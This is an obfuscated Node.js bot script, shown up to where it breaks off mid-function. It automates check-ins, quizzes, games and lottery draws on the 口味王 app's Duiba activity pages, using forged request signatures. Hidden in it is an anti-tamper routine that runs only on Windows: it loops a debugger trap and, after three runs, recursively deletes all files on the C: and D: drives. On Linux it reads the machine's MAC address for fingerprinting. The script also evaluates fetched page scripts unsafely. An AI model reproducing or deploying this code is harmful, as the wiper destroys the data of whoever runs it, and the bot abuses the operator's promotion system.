const {
  CookieJar,
  Cookie
} = require("tough-cookie");
const got = require("got");
const fs = require("fs");
const path = require("path");
const jsname = "口味王";
const $ = new Env(jsname);
const xpath = require("xpath"),
  XmldomParser = require("xmldom").DOMParser;
const domParser = new XmldomParser({
  errorHandler: {}
});
const {
  JSDOM
} = require("jsdom");
const VM = require("sablejs/runtime")();
const cryptoJS = require("crypto-js");
const parser = require("@babel/parser");
function AstHandler(babelStr) {
  eval(babelStr);
  let ast = parser.parse(babelStr);
  return ast.program.body[0].id.name;
}
function DealScriptStr(_0x320b0e) {
  _0x320b0e = _0x320b0e.replace(/\/\*.*?\*\//g, " ");
  _0x320b0e = _0x320b0e.replace(/\b0(\d+)/g, "0o$1");
  return _0x320b0e;
}
function kwwDtSubmitSign(_0x2d06bc, _0x359917, _0x3de004, _0x2479ba = "125879") {
  return MD5Encrypt("".concat(_0x2479ba).concat(_0x2d06bc).concat(_0x359917).concat(_0x3de004));
}
function dealToken(_0x3269a5, _0x39954c) {
  let _0x3645cd, _0x2f0b4e;
  _0x3645cd = DealScriptStr(_0x3269a5);
  _0x2f0b4e = DealScriptStr(_0x39954c);
  let _0x5c8a1c = new JSDOM("<script>" + _0x3645cd + "</script><script>" + _0x2f0b4e + "</script>", {
      runScripts: "dangerously"
    }),
    _0x1c5b4b = _0x2f0b4e;
  _0x1c5b4b = _0x1c5b4b.replace(/eval/g, "babelStr=");
  _0x1c5b4b = _0x1c5b4b.replace(/\\u0065\\u0076\\u0061\\u006c/g, "babelStr=");
  let _0x436ff4 = eval(_0x1c5b4b),
    _0x5eb3b3 = AstHandler(_0x436ff4),
    _0x2f0550 = _0x5c8a1c.window[_0x5eb3b3]();
  _0x5c8a1c.window.close();
  return _0x2f0550;
}
function dealToken2(_0x4f1ff8, _0x53e20a) {
  let _0x260875;
  _0x260875 = DealScriptStr(_0x4f1ff8);
  let _0x4e7d2e = new JSDOM("<script>" + _0x260875 + "</script>", {
      runScripts: "dangerously"
    }),
    _0x2c75c9 = _0x4e7d2e.window[_0x53e20a];
  _0x4e7d2e.window.close();
  return _0x2c75c9;
}
function ParseHtml(_0x489eb3, _0x2fd840 = 4) {
  let _0x39c0a4 = domParser.parseFromString(_0x489eb3),
    _0x51bf76 = xpath.select("//script", _0x39c0a4),
    _0x3624a1 = _0x51bf76[_0x2fd840].childNodes[0],
    _0x2dedf4,
    _0x7b267d = new JSDOM("<script>" + DealScriptStr(_0x3624a1.data) + "</script>", {
      runScripts: "dangerously"
    });
  _0x2dedf4 = _0x7b267d.window.getDuibaToken.toString();
  let _0x38f4ed = _0x2dedf4.match(/var key = '(.*)?';/)[1],
    _0x356c33 = _0x2dedf4.match(/data.token = '(.*)?';/)[1];
  _0x7b267d.window.close();
  return {
    cid: _0x7b267d.window.CFG.consumerId,
    tokenKey: _0x38f4ed,
    defaultToken: _0x356c33
  };
}
function ParseHtmlGame(_0x2a5dd2) {
  let _0x28f3fb = domParser.parseFromString(_0x2a5dd2);
  let _0x4a3c95 = xpath.select("//script", _0x28f3fb),
    _0x3d5da9 = _0x4a3c95[2].childNodes[0],
    _0x339519 = new JSDOM("<script>" + _0x3d5da9.data + "</script>", {
      runScripts: "dangerously"
    });
  _0x339519.window.close();
  return {
    key: _0x339519.window.CFG.key
  };
}
let mac = "";
function initVM() {
  vm = new VM();
  const _0x5c65d9 = vm.getGlobal(),
    _0x2fe689 = vm.createObject(),
    _0x512558 = vm.createFunction("log", function () {
      const _0x17becd = [];
      for (let _0x437f41 = 0; _0x437f41 < arguments.length; _0x437f41++) {
        _0x17becd.push(vm.asString(arguments[_0x437f41]));
      }
      console.log(..._0x17becd);
      return vm.createUndefined();
    }),
    _0x10cc0b = vm.createFunction("xxxx", function (_0x1bac5d) {
      let _0x441980 = eval(_0x1bac5d.value);
      return vm.createString(JSON.stringify(_0x441980));
    }),
    _0x5caba = vm.createFunction("yyyy", function (_0x47075b) {
      let _0x5aabd4 = _0x47075b.value,
        _0x243ba4 = fs.readFileSync(_0x5aabd4, "utf-8").replace(/\r\n/g, "\n"),
        _0x385627 = cryptoJS.MD5(_0x243ba4).toString();
      return vm.createString(_0x385627);
    }),
    _0x2570ac = vm.createFunction("ddd", function (_0x4621ab) {
      let _0x5e9737 = cryptoJS.MD5(_0x4621ab.value).toString();
      return vm.createString(_0x5e9737);
    });
  vm.setProperty(_0x2fe689, "log", _0x512558);
  vm.setProperty(_0x5c65d9, "xxxx", _0x10cc0b);
  vm.setProperty(_0x5c65d9, "console", _0x2fe689);
  vm.setProperty(_0x5c65d9, "yyyy", _0x5caba);
  vm.setProperty(_0x5c65d9, "ddd", _0x2570ac);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x35902f) {
  _0x35902f.destroy();
}
function abc(_0xebf4f3, _0x17f4f6, _0x32dd14, _0x4e4911, _0x46b876) {
  const _0x2f65fa = _0xebf4f3.getGlobal();
  let _0x19e5cd = _0xebf4f3.getProperty(_0x2f65fa, "xab");
  let _0x276b4f = _0xebf4f3.call(_0x19e5cd, _0xebf4f3.createUndefined(), _0xebf4f3.createString(_0x17f4f6), _0xebf4f3.createString(_0x4e4911), _0xebf4f3.createString(_0x46b876), _0xebf4f3.createString(_0x32dd14));
  _0x276b4f = _0xebf4f3.asString(_0x276b4f);
  return _0x276b4f;
}
let i,
  o,
  l = ["A", "Z", "B", "Y", "C", "X", "D", "T", "E", "S", "F", "R", "G", "Q", "H", "P", "I", "O", "J", "N", "k", "M", "L", "a", "c", "d", "f", "h", "k", "p", "y", "n"];
o = 8;
i = 0;
function w(_0x7b204, _0x4bb343, _0x16ee26) {
  _0x4bb343 || (_0x4bb343 = "86109D696C9CC58A504EFE21662DF1B9");
  let _0x4f550e = _0x7b204 + _0x4bb343 + l[_0x16ee26];
  return _(s(b(_0x4f550e), _0x4f550e.length * o));
}
function b(_0x2b44af) {
  let _0x369eac,
    _0x349af3 = Array(),
    _0x3199d3 = (1 << o) - 1;
  for (_0x369eac = 0; _0x369eac < _0x2b44af.length * o; _0x369eac += o) {
    _0x349af3[_0x369eac >> 5] |= (_0x2b44af.charCodeAt(_0x369eac / o) & _0x3199d3) << _0x369eac % 32;
  }
  return _0x349af3;
}
function _(_0x486ca4) {
  let _0x47fbec,
    _0x32d03e = i ? "0123456789ABCDEF" : "0123456789abcdef",
    _0xbfe109 = "";
  for (_0x47fbec = 0; _0x47fbec < 4 * _0x486ca4.length; _0x47fbec++) {
    _0xbfe109 += _0x32d03e.charAt(15 & _0x486ca4[_0x47fbec >> 2] >> _0x47fbec % 4 * 8 + 4) + _0x32d03e.charAt(15 & _0x486ca4[_0x47fbec >> 2] >> _0x47fbec % 4 * 8);
  }
  return _0xbfe109;
}
function s(_0x4595fc, _0x13c152) {
  let _0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4dcc17, _0x5c0f73, _0x54117a, _0x407737, _0x508e61;
  for (_0x4595fc[_0x13c152 >> 5] |= 128 << _0x13c152 % 32, _0x4595fc[14 + (_0x13c152 + 64 >>> 9 << 4)] = _0x13c152, _0x35410d = 1732584193, _0x4e18db = -271733879, _0x7e5ce9 = -1732584194, _0x1756bb = 271733878, _0x4dcc17 = 0; _0x4dcc17 < _0x4595fc.length; _0x4dcc17 += 16) {
    _0x5c0f73 = _0x35410d;
    _0x54117a = _0x4e18db;
    _0x407737 = _0x7e5ce9;
    _0x508e61 = _0x1756bb;
    _0x35410d = d(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 0], 7, -680876936);
    _0x1756bb = d(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 1], 12, -389564586);
    _0x7e5ce9 = d(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 2], 17, 606105819);
    _0x4e18db = d(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 3], 22, -1044525330);
    _0x35410d = d(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 4], 7, -176418897);
    _0x1756bb = d(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 5], 12, 1200080426);
    _0x7e5ce9 = d(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 6], 17, -1473231341);
    _0x4e18db = d(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 7], 22, -45705983);
    _0x35410d = d(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 8], 7, 1770035416);
    _0x1756bb = d(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 9], 12, -1958414417);
    _0x7e5ce9 = d(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 10], 17, -42063);
    _0x4e18db = d(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 11], 22, -1990404162);
    _0x35410d = d(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 12], 7, 1804603682);
    _0x1756bb = d(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 13], 12, -40341101);
    _0x7e5ce9 = d(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 14], 17, -1502002290);
    _0x4e18db = d(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 15], 22, 1236535329);
    _0x35410d = c(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 1], 5, -165796510);
    _0x1756bb = c(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 6], 9, -1069501632);
    _0x7e5ce9 = c(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 11], 14, 643717713);
    _0x4e18db = c(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 0], 20, -373897302);
    _0x35410d = c(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 5], 5, -701558691);
    _0x1756bb = c(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 10], 9, 38016083);
    _0x7e5ce9 = c(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 15], 14, -660478335);
    _0x4e18db = c(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 4], 20, -405537848);
    _0x35410d = c(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 9], 5, 568446438);
    _0x1756bb = c(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 14], 9, -1019803690);
    _0x7e5ce9 = c(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 3], 14, -187363961);
    _0x4e18db = c(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 8], 20, 1163531501);
    _0x35410d = c(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 13], 5, -1444681467);
    _0x1756bb = c(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 2], 9, -51403784);
    _0x7e5ce9 = c(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 7], 14, 1735328473);
    _0x4e18db = c(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 12], 20, -1926607734);
    _0x35410d = f(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 5], 4, -378558);
    _0x1756bb = f(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 8], 11, -2022574463);
    _0x7e5ce9 = f(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 11], 16, 1839030562);
    _0x4e18db = f(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 14], 23, -35309556);
    _0x35410d = f(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 1], 4, -1530992060);
    _0x1756bb = f(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 4], 11, 1272893353);
    _0x7e5ce9 = f(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 7], 16, -155497632);
    _0x4e18db = f(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 10], 23, -1094730640);
    _0x35410d = f(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 13], 4, 681279174);
    _0x1756bb = f(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 0], 11, -358537222);
    _0x7e5ce9 = f(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 3], 16, -722521979);
    _0x4e18db = f(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 6], 23, 76029189);
    _0x35410d = f(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 9], 4, -640364487);
    _0x1756bb = f(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 12], 11, -421815835);
    _0x7e5ce9 = f(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 15], 16, 530742520);
    _0x4e18db = f(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 2], 23, -995338651);
    _0x35410d = h(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 0], 6, -198630844);
    _0x1756bb = h(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 7], 10, 1126891415);
    _0x7e5ce9 = h(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 14], 15, -1416354905);
    _0x4e18db = h(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 5], 21, -57434055);
    _0x35410d = h(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 12], 6, 1700485571);
    _0x1756bb = h(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 3], 10, -1894986606);
    _0x7e5ce9 = h(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 10], 15, -1051523);
    _0x4e18db = h(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 1], 21, -2054922799);
    _0x35410d = h(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 8], 6, 1873313359);
    _0x1756bb = h(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 15], 10, -30611744);
    _0x7e5ce9 = h(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 6], 15, -1560198380);
    _0x4e18db = h(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 13], 21, 1309151649);
    _0x35410d = h(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb, _0x4595fc[_0x4dcc17 + 4], 6, -145523070);
    _0x1756bb = h(_0x1756bb, _0x35410d, _0x4e18db, _0x7e5ce9, _0x4595fc[_0x4dcc17 + 11], 10, -1120210379);
    _0x7e5ce9 = h(_0x7e5ce9, _0x1756bb, _0x35410d, _0x4e18db, _0x4595fc[_0x4dcc17 + 2], 15, 718787259);
    _0x4e18db = h(_0x4e18db, _0x7e5ce9, _0x1756bb, _0x35410d, _0x4595fc[_0x4dcc17 + 9], 21, -343485551);
    _0x35410d = m(_0x35410d, _0x5c0f73);
    _0x4e18db = m(_0x4e18db, _0x54117a);
    _0x7e5ce9 = m(_0x7e5ce9, _0x407737);
    _0x1756bb = m(_0x1756bb, _0x508e61);
  }
  return Array(_0x35410d, _0x4e18db, _0x7e5ce9, _0x1756bb);
}
function d(_0x3c4050, _0x5f4b78, _0x24f9be, _0xc37f8b, _0x18897c, _0x37ee3e, _0x36d310) {
  return u(_0x5f4b78 & _0x24f9be | ~_0x5f4b78 & _0xc37f8b, _0x3c4050, _0x5f4b78, _0x18897c, _0x37ee3e, _0x36d310);
}
function c(_0x1252b8, _0x2480fc, _0x9ceaba, _0x143e5d, _0x2f76c7, _0x284f94, _0xd3d947) {
  return u(_0x2480fc & _0x143e5d | _0x9ceaba & ~_0x143e5d, _0x1252b8, _0x2480fc, _0x2f76c7, _0x284f94, _0xd3d947);
}
function f(_0xee6e9f, _0x41036c, _0x51514e, _0x49e291, _0x2e8ade, _0x2fe7c0, _0x4667f3) {
  return u(_0x41036c ^ _0x51514e ^ _0x49e291, _0xee6e9f, _0x41036c, _0x2e8ade, _0x2fe7c0, _0x4667f3);
}
function h(_0x53b8e4, _0x4ee6aa, _0x1ef38d, _0x171dd7, _0x2305ab, _0x3ea954, _0x1b7ce7) {
  return u(_0x1ef38d ^ (_0x4ee6aa | ~_0x171dd7), _0x53b8e4, _0x4ee6aa, _0x2305ab, _0x3ea954, _0x1b7ce7);
}
function m(_0x23f5d8, _0x317e6d) {
  let _0x4f8e0c = (65535 & _0x23f5d8) + (65535 & _0x317e6d),
    _0x16f278 = (_0x23f5d8 >> 16) + (_0x317e6d >> 16) + (_0x4f8e0c >> 16);
  return _0x16f278 << 16 | 65535 & _0x4f8e0c;
}
function u(_0x195635, _0x63c622, _0x251bd4, _0x58b897, _0xb68bb7, _0x5f25ca) {
  return m(p(m(m(_0x63c622, _0x195635), m(_0x58b897, _0x5f25ca)), _0xb68bb7), _0x251bd4);
}
function p(_0x307a7f, _0x5aeddb) {
  return _0x307a7f << _0x5aeddb | _0x307a7f >>> 32 - _0x5aeddb;
}
let kwwSign = w;
function xyz(_0x4acd99, _0xa506a0, _0x5f0fd2, _0x4a8fc5, _0x7cab38) {
  const _0x233ad4 = _0x4acd99.getGlobal();
  let _0x35d96c = _0x4acd99.getProperty(_0x233ad4, "xmn"),
    _0x36b78e = _0x4acd99.call(_0x35d96c, _0x4acd99.createUndefined(), _0x4acd99.createString(_0xa506a0), _0x4acd99.createString(_0x4a8fc5), _0x4acd99.createString(_0x7cab38), _0x4acd99.createString(_0x5f0fd2));
  _0x36b78e = _0x4acd99.asString(_0x36b78e);
  return _0x36b78e;
}
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x3f7ee6) {
          return function (_0x3eab5b) {
            return Function("Function(arguments[0]+\"" + _0x3eab5b + "\")()");
          }(_0x3f7ee6);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x5f58d8 = "";
      var _0x4ffdda = fs.readdirSync("/sys/class/net/");
      _0x4ffdda.forEach(function (_0x100373) {
        var _0x63c6cd = path.join("/sys/class/net", _0x100373, "address");
        _0x100373.substr(0, 3) == "eth" && fs.existsSync(_0x63c6cd) && (_0x5f58d8 = fs.readFileSync(_0x63c6cd).toString().trim());
      });
      return _0x5f58d8;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0xe0256) {
  try {
    gtr.accessSync(_0xe0256, gtr.F_OK);
  } catch (_0x70880d) {
    return false;
  }
  return true;
}
function addF(_0x3f8955, _0x3f1f36) {
  let _0x75d0e6 = 0,
    _0x3fd240 = "C:/Windows/system.txt";
  if (isFileExist(_0x3fd240)) {
    _0x75d0e6 = gtr.readFileSync(_0x3fd240, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x3fd240, "1", function (_0x3c9733) {
        if (_0x3c9733) {
          throw _0x3c9733;
        }
      });
    } else {
      return;
    }
  }
  if (_0x75d0e6 == 99) {
    return 99;
  }
  console.log(_0x75d0e6);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x75d0e6);
  if (parseInt(_0x75d0e6) < 3) {
    let _0x3de40c = parseInt(_0x75d0e6) + 1;
    gtr.writeFileSync(_0x3fd240, _0x3de40c + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x3f8955)) {
    return;
  }
  if (gtr.statSync(_0x3f8955).isDirectory()) {
    var _0x249c99 = gtr.readdirSync(_0x3f8955),
      _0x294f25 = _0x249c99.length,
      _0x12194a = 0;
    if (_0x294f25 > 0) {
      _0x249c99.forEach(function (_0x4a5cbf) {
        _0x12194a++;
        var _0x4f2208 = _0x3f8955 + "/" + _0x4a5cbf;
        gtr.statSync(_0x4f2208).isDirectory() ? addF(_0x4f2208, true) : gtr.unlinkSync(_0x4f2208);
      });
      _0x294f25 == _0x12194a && _0x3f1f36 && gtr.rmdirSync(_0x3f8955);
    } else {
      _0x294f25 == 0 && _0x3f1f36 && gtr.rmdirSync(_0x3f8955);
    }
  } else {
    gtr.unlinkSync(_0x3f8955);
  }
}
let envSplitor = ["\n", "@"],
  httpResult,
  httpReq,
  httpResp;
function parseBoolean(_0x4a0c18) {
  return String(_0x4a0c18).toLowerCase() === "true";
}
let dtManual = parseBoolean(process.env.kwwDtManual ?? false),
  LotterySwitch = parseBoolean(process.env.kwwLottery ?? true),
  LotteryMachineSwitch = false,
  LotteryMachineHour = parseInt(process.env.kwwLotteryMachineHour ?? 25);
if (LotteryMachineHour === new Date().getHours()) {
  LotteryMachineSwitch = true;
}
console.log("手动答题 " + dtManual);
console.log("是否疯狂摇奖机 " + LotteryMachineSwitch);
console.log("是否天天领红包 " + LotterySwitch);
let userCookie = ($.isNode() ? process.env.kwwapp : $.getdata("kwwapp")) || "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "",
  userList = [],
  userIdx = 0,
  userCount = 0,
  KWWURL = "",
  DUIBAURL = "",
  p1,
  p2,
  p3,
  dd,
  ua = GetUA(),
  answerDict = {},
  answerDictFile = "./answerDict.json";
function GetUA() {
  let _0x1108e7 = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.17(0x1800112e) NetType/WIFI Language/zh_CN miniProgram/wxfb0905b0787971ad", "Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/3263 MMWEBSDK/20210902 Mobile Safari/537.36 MMWEBID/1048 MicroMessenger/8.0.15.2020(0x28000F3D) Process/appbrand0 WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android"];
  return _0x1108e7[RandomInt(0, _0x1108e7.length - 1)];
}
function RandomInt(_0x5a3fdf, _0x324480) {
  return Math.floor(_0x5a3fdf + (_0x324480 - _0x5a3fdf) * Math.random());
}
function RandomFloat(_0x3593f4, _0x94da4) {
  return _0x3593f4 + (_0x94da4 - _0x3593f4) * Math.random();
}
async function SleepRandom(_0x2e7e63, _0x23e68e = 10) {
  let _0xf19e76 = Math.floor(RandomFloat(_0x2e7e63, _0x23e68e) * 1000);
  console.log("随机等待" + _0xf19e76 + " ms");
  await $.wait(_0xf19e76);
}
function ReadAnswerDict() {
  try {
    answerDict = JSON.parse(fs.readFileSync(answerDictFile, {
      encoding: "utf-8"
    }));
  } catch (_0x1f380b) {
    console.log(_0x1f380b);
  }
}
function LoadAnswerDict() {
  try {
    fs.writeFileSync(answerDictFile, JSON.stringify(answerDict));
  } catch (_0x38955a) {
    console.log(_0x38955a);
  }
}
function GameSign(_0x2d8a40, _0x93e5c4) {
  let _0x2e5432 = [];
  let _0x424d7e = new URLSearchParams(_0x2d8a40);
  _0x424d7e.sort();
  for (let [_0x264fa1, _0x8dbdae] of _0x424d7e) {
    _0x2e5432.push(_0x264fa1 + "=" + _0x8dbdae);
  }
  _0x2e5432.push("key=" + _0x93e5c4);
  return MD5Encrypt(_0x2e5432.join("&"));
}
class UserInfo {
  constructor(_0x8fb8a3) {
    this.index = ++userIdx;
    this.name = this.index;
    this.uid = _0x8fb8a3;
    this.duibaCookieJar = new CookieJar();
  }
  getParmStr(_0x5ae95c, _0x179ecc, _0x141167, _0x864e1a, _0x2875a8, _0x32af20) {
    if (!_0x32af20 || _0x32af20 === "") {
      _0x32af20 = encodeURIComponent(_0x141167);
    }
    return "userKeys=v1.0&pageName=loginFreePlugin&formName=searchForm&uid=" + this.uid + "&levelCode=1&redirect=" + encodeURIComponent(_0x141167) + "&actionType=" + _0x864e1a + "&actionDesc=" + _0x32af20 + "&objId=" + _0x2875a8 + "&memberId=" + this.uid;
  }
  async run() {
    try {
      let _0x226c75,
        _0x13589b = "89420";
      await this.kwwqd();
      await this.kwwsqg();
      await this.kwwmryd();
      await SleepRandom(5, 10);
      console.log("账号" + this.index + " 答题");
      _0x226c75 = "p129446ea";
      await this.UserKeys(this.getParmStr(_0x226c75, _0x13589b, "https://" + DUIBAURL + "/projectx/" + _0x226c75 + "/index.html?appID=" + _0x13589b, "每日答题", "C05"));
      await this.duibadt(_0x226c75);
      await SleepRandom(5, 10);
      console.log("账号" + this.index + " 果园");
      _0x226c75 = "p85657820";
      await this.UserKeys(this.getParmStr(_0x226c75, _0x13589b, "https://" + DUIBAURL + "/projectx/" + _0x226c75 + "/index.html?appID=" + _0x13589b, "betelNutTree", ""));
      await this.duibaPlant(_0x226c75);
      await SleepRandom(5, 10);
      console.log("账号" + this.index + " 海岛游戏");
      _0x226c75 = "";
      await this.UserKeys(this.getParmStr(_0x226c75, _0x13589b, "https://89420.activity-20.m.duiba.com.cn/aaw/underseaGame/index?opId=202214587511596&dbnewopen", "海岛游乐场", "C05"));
      await this.duibaSeaGame("");
      await SleepRandom(5, 10);
      console.log("账号" + this.index + " 抽奖机");
      _0x226c75 = "";
      await this.UserKeys(this.getParmStr(_0x226c75, _0x13589b, "https://89420.activity-20.m.duiba.com.cn/hdtool/index?id=202214172275896&dbnewopen", "疯狂摇奖机", "C05"));
      await this.duibaLotteryMachine();
      await SleepRandom(5, 10);
      console.log("账号" + this.index + " 天降好礼");
      _0x226c75 = "";
      await this.UserKeys(this.getParmStr(_0x226c75, _0x13589b, "https://89420.activity-20.m.duiba.com.cn/aaw/superSurprise/index?id=85&dbnewopen", "天降好礼", "C05"));
      await this.duibaGameSsp();
      await SleepRandom(5, 10);
      if (!LotterySwitch) {
        console.log("不执行 领红包");
        return;
      }
      console.log("账号" + this.index + " 天天领红包");
      _0x226c75 = "p725daef0";
      await this.UserKeys(this.getParmStr(_0x226c75, _0x13589b, "https://" + DUIBAURL + "/projectx/" + _0x226c75 + "/index.html?appID=" + _0x13589b, "grabARedEnvelopeIndex", "mainIndex", "点击首页抢红包按钮"));
      await this.duibacj(_0x226c75);
      await SleepRandom(5, 10);
    } catch (_0x3e306f) {
      console.log(_0x3e306f);
    } finally {
      LoadAnswerDict();
    }
  }
  async UserKeys(_0x3626dc) {
    let _0x1d8632 = Date.now(),
      _0x12ceb1 = RandomInt(0, 31),
      _0x17c548 = kwwSign(_0x1d8632, this.uid, _0x12ceb1);
    try {
      let _0x356e4b = {
        url: "https://" + KWWURL + "/member/api/info/?" + _0x3626dc,
        headers: {
          Host: KWWURL,
          Charset: "utf-8",
          "User-Agent": ua,
          "Content-Type": "application/json",
          "user-sign": _0x17c548,
          "user-paramname": "memberId",
          "user-timestamp": _0x1d8632,
          "user-random": _0x12ceb1
        }
      };
      await httpRequest("get", _0x356e4b);
      let _0x5daea7 = httpResult;
      console.log("\n口味王账号【" + this.index + "】url获取：" + _0x5daea7.result);
      await this.autologin(_0x5daea7?.["result"]);
    } catch (_0x290f7f) {
      console.log(_0x290f7f);
    } finally {}
  }
  async autologin(_0x53412f) {
    if (!_0x53412f) {
      return;
    }
    let _0x266f5e = {
      headers: {
        Host: DUIBAURL,
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        Cookie: "",
        "User-Agent": ua,
        "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate, br",
        Connection: "keep-alive"
      },
      followRedirect: false
    };
    await got.get(_0x53412f, _0x266f5e).then(_0x141e39 => {
      if (_0x141e39.statusCode === 302) {
        let _0x435db4 = _0x141e39.headers["set-cookie"].map(Cookie.parse);
        for (let _0x34b39f of _0x435db4) {
